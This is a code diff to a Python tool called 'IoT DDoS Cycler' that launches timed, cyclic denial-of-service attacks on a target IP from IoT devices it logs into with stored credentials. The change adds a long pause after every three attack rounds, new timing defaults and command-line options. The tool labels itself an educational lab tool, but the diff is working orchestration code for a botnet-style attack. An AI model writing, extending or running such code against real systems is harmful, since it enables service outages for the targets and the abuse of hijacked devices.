@@ -21,8 +21,10 @@ class DDoSCycler:
         self.attack_threads = []
         self.current_cycle = 0
         self.total_cycles = 6
-        self.attack_duration = 300  # 5 minutes in seconds
+        self.attack_duration = 240  # 4 minutes in seconds
         self.pause_duration = 120   # 2 minutes in seconds
+        self.long_pause_duration = 300  # 5 minutes in seconds (after every 3 attacks)
+        self.attacks_per_group = 3  # Number of attacks before long pause
         
     def add_device(self, ip, username, password):
         """Add a device to be used for DDoS attack"""
@@ -141,22 +143,47 @@ class DDoSCycler:
         # Cycle configuration
         print(f"\nCurrent configuration:")
         print(f"  Attack duration: {self.attack_duration // 60} minutes")
-        print(f"  Pause duration: {self.pause_duration // 60} minutes")
+        print(f"  Regular pause duration: {self.pause_duration // 60} minutes")
+        print(f"  Long pause duration: {self.long_pause_duration // 60} minutes")
+        print(f"  Attacks per group: {self.attacks_per_group}")
         print(f"  Total cycles: {self.total_cycles}")
-        print(f"  Total time: {(self.attack_duration + self.pause_duration) * self.total_cycles // 60} minutes")
+        
+        # Calculate total time with new pattern
+        cycles_per_group = self.attacks_per_group
+        full_groups = self.total_cycles // cycles_per_group
+        remaining_cycles = self.total_cycles % cycles_per_group
+        time_per_group = (self.attack_duration + self.pause_duration) * cycles_per_group + self.long_pause_duration
+        time_remaining = (self.attack_duration + self.pause_duration) * remaining_cycles
+        if remaining_cycles > 0:
+            time_remaining -= self.pause_duration  # No pause after the last cycle
+        total_time = time_per_group * full_groups + time_remaining
+        print(f"  Total time: {total_time // 60} minutes")
+        print(f"  Pattern: {cycles_per_group} attacks of {self.attack_duration//60}min + {self.pause_duration//60}min pause, then {self.long_pause_duration//60}min long pause")
         
         modify = input("\nModify timing? (y/N): ").strip().lower()
         if modify == 'y':
             try:
                 attack_min = int(input(f"Attack duration (minutes, current: {self.attack_duration // 60}): ") or str(self.attack_duration // 60))
-                pause_min = int(input(f"Pause duration (minutes, current: {self.pause_duration // 60}): ") or str(self.pause_duration // 60))
+                pause_min = int(input(f"Regular pause duration (minutes, current: {self.pause_duration // 60}): ") or str(self.pause_duration // 60))
+                long_pause_min = int(input(f"Long pause duration (minutes, current: {self.long_pause_duration // 60}): ") or str(self.long_pause_duration // 60))
+                attacks_per_group = int(input(f"Attacks per group (current: {self.attacks_per_group}): ") or str(self.attacks_per_group))
                 cycles = int(input(f"Number of cycles (current: {self.total_cycles}): ") or str(self.total_cycles))
                 
                 self.attack_duration = attack_min * 60
                 self.pause_duration = pause_min * 60
+                self.long_pause_duration = long_pause_min * 60
+                self.attacks_per_group = attacks_per_group
                 self.total_cycles = cycles
                 
-                total_time = (self.attack_duration + self.pause_duration) * self.total_cycles
+                # Recalculate total time
+                cycles_per_group = self.attacks_per_group
+                full_groups = self.total_cycles // cycles_per_group
+                remaining_cycles = self.total_cycles % cycles_per_group
+                time_per_group = (self.attack_duration + self.pause_duration) * cycles_per_group + self.long_pause_duration
+                time_remaining = (self.attack_duration + self.pause_duration) * remaining_cycles
+                if remaining_cycles > 0:
+                    time_remaining -= self.pause_duration
+                total_time = time_per_group * full_groups + time_remaining
                 print(f"[INFO] Updated configuration - Total time: {total_time // 60} minutes")
                 
             except ValueError:
@@ -226,7 +253,7 @@ class DDoSCycler:
             print(f"[CYCLE {cycle_num}] [ERROR] Attack from {ip} failed: {e}")
     
     def run_ddos_cycle(self):
-        """Run the complete DDoS cycling attack"""
+        """Run the complete DDoS cycling attack with custom timing pattern"""
         if not self.attack_devices:
             print("[ERROR] No attack devices configured")
             return
@@ -235,12 +262,25 @@ class DDoSCycler:
             print("[ERROR] No target IP configured")
             return
         
+        # Calculate total time with new pattern
+        # Pattern: 3 attacks (4min + 2min each) + 5min long pause, repeated
+        cycles_per_group = self.attacks_per_group
+        full_groups = self.total_cycles // cycles_per_group
+        remaining_cycles = self.total_cycles % cycles_per_group
+        
+        # Time calculation for the new pattern
+        time_per_group = (self.attack_duration + self.pause_duration) * cycles_per_group + self.long_pause_duration
+        time_remaining = (self.attack_duration + self.pause_duration) * remaining_cycles
+        if remaining_cycles > 0:
+            time_remaining -= self.pause_duration  # No pause after the last cycle
+        total_time = time_per_group * full_groups + time_remaining
+        
         print(f"\n[DDOS CYCLER] Starting cyclic DDoS attack")
         print(f"[INFO] Target: {self.target_ip}")
         print(f"[INFO] Attack devices: {len(self.attack_devices)}")
         print(f"[INFO] Pattern: {self.attack_duration//60}min attack, {self.pause_duration//60}min pause")
+        print(f"[INFO] Long pause after every {self.attacks_per_group} attacks: {self.long_pause_duration//60}min")
         print(f"[INFO] Total cycles: {self.total_cycles}")
-        total_time = (self.attack_duration + self.pause_duration) * self.total_cycles
         print(f"[INFO] Total duration: {total_time//60} minutes")
         
         start_time = datetime.now()
@@ -293,16 +333,29 @@ class DDoSCycler:
                 # Reset stop flag for next cycle
                 self.stop_attack = False
                 
-                # Pause phase (unless it's the last cycle)
-                if cycle < self.total_cycles:
-                    print(f"\n{'='*60}")
-                    print(f"CYCLE {cycle}/{self.total_cycles} - PAUSE PHASE")
-                    print(f"{'='*60}")
+                # Determine pause type and duration
+                if cycle < self.total_cycles:  # Not the last cycle
+                    # Check if this is the end of a 3-attack group
+                    if cycle % self.attacks_per_group == 0:
+                        # Long pause after every 3 attacks
+                        pause_type = "LONG PAUSE"
+                        current_pause_duration = self.long_pause_duration
+                        print(f"\n{'='*60}")
+                        print(f"CYCLE {cycle}/{self.total_cycles} - {pause_type} ({self.long_pause_duration//60} minutes)")
+                        print(f"{'='*60}")
+                    else:
+                        # Regular pause
+                        pause_type = "PAUSE"
+                        current_pause_duration = self.pause_duration
+                        print(f"\n{'='*60}")
+                        print(f"CYCLE {cycle}/{self.total_cycles} - {pause_type} ({self.pause_duration//60} minutes)")
+                        print(f"{'='*60}")
                     
+                    # Execute pause
                     pause_start = time.time()
-                    while (time.time() - pause_start) < self.pause_duration and not self.stop_attack:
-                        remaining = self.pause_duration - (time.time() - pause_start)
-                        print(f"[CYCLE {cycle}] Pause phase - {remaining:.0f}s remaining")
+                    while (time.time() - pause_start) < current_pause_duration and not self.stop_attack:
+                        remaining = current_pause_duration - (time.time() - pause_start)
+                        print(f"[CYCLE {cycle}] {pause_type} phase - {remaining:.0f}s remaining")
                         time.sleep(10)  # Update every 10 seconds
         
         except KeyboardInterrupt:
@@ -340,9 +393,11 @@ def main():
     parser = argparse.ArgumentParser(description='IoT DDoS Cycler - Configurable cycling DDoS attacks')
     parser.add_argument('--target', help='Target IP address')
     parser.add_argument('--devices', help='JSON file containing attack devices')
-    parser.add_argument('--attack-time', type=int, default=5, help='Attack duration in minutes (default: 5)')
-    parser.add_argument('--pause-time', type=int, default=2, help='Pause duration in minutes (default: 2)')
+    parser.add_argument('--attack-time', type=int, default=4, help='Attack duration in minutes (default: 4)')
+    parser.add_argument('--pause-time', type=int, default=2, help='Regular pause duration in minutes (default: 2)')
+    parser.add_argument('--long-pause', type=int, default=5, help='Long pause duration in minutes after every 3 attacks (default: 5)')
     parser.add_argument('--cycles', type=int, default=6, help='Number of cycles (default: 6)')
+    parser.add_argument('--attacks-per-group', type=int, default=3, help='Number of attacks before long pause (default: 3)')
     parser.add_argument('--add-device', nargs=3, metavar=('IP', 'USERNAME', 'PASSWORD'), 
                        help='Add a single device (IP USERNAME PASSWORD)')
     
@@ -353,6 +408,8 @@ def main():
     # Configure timing from arguments
     ddos_cycler.attack_duration = args.attack_time * 60
     ddos_cycler.pause_duration = args.pause_time * 60
+    ddos_cycler.long_pause_duration = args.long_pause * 60
+    ddos_cycler.attacks_per_group = args.attacks_per_group
     ddos_cycler.total_cycles = args.cycles
     
     print("IoT DDoS Cycler - Educational Lab Tool")
